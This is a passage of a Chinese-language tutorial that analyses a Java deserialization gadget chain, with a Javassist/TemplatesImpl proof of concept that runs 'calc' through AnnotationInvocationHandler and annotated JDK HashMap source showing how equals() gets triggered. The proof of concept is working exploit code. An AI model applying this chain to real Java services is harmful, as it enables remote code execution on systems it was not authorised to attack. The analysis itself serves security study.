</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">CtClass</span> <span style="color:#e06c75">cc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">test</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">cmd</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClassInitializer</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">insertBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">cmd</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setSuperclass</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">AbstractTranslet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">())));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TemplatesImpl</span> <span style="color:#e06c75">templatesImpl</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">TemplatesImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span> <span style="color:#e06c75">tc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">nameField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_name&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#98c379">&#34;a&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//由于getTransletInstance中_name=null会retrun null，所以利用反射，将_name赋值
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">bytecodesField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_bytecodes&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">codes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytecode</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]</span> <span style="color:#e06c75">bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]{</span><span style="color:#e06c75">codes</span><span style="color:#56b6c2">};</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//同理defineTransletClasses中_bytecodes == null会抛出异常，所以将其赋值
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">tfactoryField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_tfactory&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#c678dd">new</span> <span style="color:#e06c75">TransformerFactoryImpl</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//本意是为了在defineTransletClasses中，避免_tfactory值为null，导致_tfactory.getExternalExtensionsMap()错误
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#7f848e">//但实际上并不影响代码执行
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">aClass</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">forName</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Constructor</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">aClass</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredConstructor</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hashMap</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">InvocationHandler</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">InvocationHandler</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Templates</span> <span style="color:#e06c75">proxy</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">Proxy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newProxyInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ClassLoader</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getSystemClassLoader</span><span style="color:#56b6c2">(),</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">[]{</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">},</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">proxy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p><strong>调用细节</strong>：因为<code>proxy</code>调用了<code>equals</code>，所以进入<code>AnnotationInvocationHandler.equals</code>方法</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#e06c75">Object</span> <span style="color:#61afef;font-weight:bold">invoke</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">proxy</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Method</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">member</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//member = &#34;equals&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;[]</span> <span style="color:#e06c75">paramTypes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getParameterTypes</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;equals&#34;</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">paramTypes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">1</span> <span style="color:#56b6c2">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">paramTypes</span><span style="color:#56b6c2">[</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">equalsImpl</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">args</span><span style="color:#56b6c2">[</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">]);</span>
</span></span><span style="display:flex;"><span>        	<span style="color:#7f848e">//args[0] = templatesImpl
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>       
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#e06c75">Boolean</span> <span style="color:#61afef;font-weight:bold">equalsImpl</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">o</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//o = templatesImpl
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#56b6c2">...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Method</span> <span style="color:#e06c75">memberMethod</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">getMemberMethods</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#7f848e">//type = Templates.class
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#7f848e">//获取Templates.class的Methods
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#7f848e">//memberMethod = newTransformer
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#e06c75">String</span> <span style="color:#e06c75">member</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberMethod</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Object</span> <span style="color:#e06c75">ourValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Object</span> <span style="color:#e06c75">hisValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">AnnotationInvocationHandler</span> <span style="color:#e06c75">hisHandler</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">asOneOfUs</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">o</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">hisHandler</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">hisValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">hisHandler</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">hisValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberMethod</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">invoke</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">o</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#7f848e">//newTransformer.invoke(templatesImpl);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#7f848e">//调用TemplatesImpl.newTransformer()
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">InvocationTargetException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">return</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">IllegalAccessException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">AssertionError</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">memberValueEquals</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ourValue</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">hisValue</span><span style="color:#56b6c2">))</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">return</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e5c07b">true</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>从而执行<code>TemplatesImpl.newTransformer</code></p>
<h4 id="构造第二部分poc">构造第二部分POC</h4>
<p>接着寻找哪个类会调用<code>equals</code>方法，看到<code>HashMap</code>类</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#e06c75">V</span> <span style="color:#61afef;font-weight:bold">put</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">putForNullKey</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">indexFor</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//根据hash值得到对应的i
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">i</span><span style="color:#56b6c2">];</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">next</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#7f848e">//从i开始, 遍历table[i]往后的元素
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#e06c75">Object</span> <span style="color:#e06c75">k</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hash</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">hash</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">((</span><span style="color:#e06c75">k</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">key</span> <span style="color:#56b6c2">||</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">k</span><span style="color:#56b6c2">)))</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//如果e.hash == hash, 并且e.key != key, 就会进入equals方法
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                <span style="color:#e06c75">V</span> <span style="color:#e06c75">oldValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">value</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">value</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recordAccess</span><span style="color:#56b6c2">(</span><span style="color:#c678dd">this</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">return</span> <span style="color:#e06c75">oldValue</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">modCount</span><span style="color:#56b6c2">++;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">addEntry</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>在 HashMap.put 内部调用了<code>equals</code>方法，那么让我们研究一下如何进入 key.equals()</p>
<p>我们知道<code>i</code>（遍历 table 的起始下标）是根据 key 的<code>hash</code>值得到的</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">static</span> <span style="color:#e5c07b">int</span> <span style="color:#61afef;font-weight:bold">indexFor</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">h</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">int</span> <span style="color:#e06c75">length</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> <span style="color:#e06c75">h</span> <span style="color:#56b6c2">&amp;</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>如果 table 没有对应的<code>i</code>下标，就会跳过for循环，调用 addEntry 方法，往 table 中添加对应的<code>Entry</code></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">addEntry</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">int</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">((</span><span style="color:#e06c75">size</span> <span style="color:#56b6c2">&gt;=</span> <span style="color:#e06c75">threshold</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">null</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">]))</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">resize</span><span style="color:#56b6c2">(</span><span style="color:#d19a66">2</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">hash</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">null</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">?</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">:</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">bucketIndex</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">indexFor</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">createEntry</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">createEntry</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">int</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">];</span>
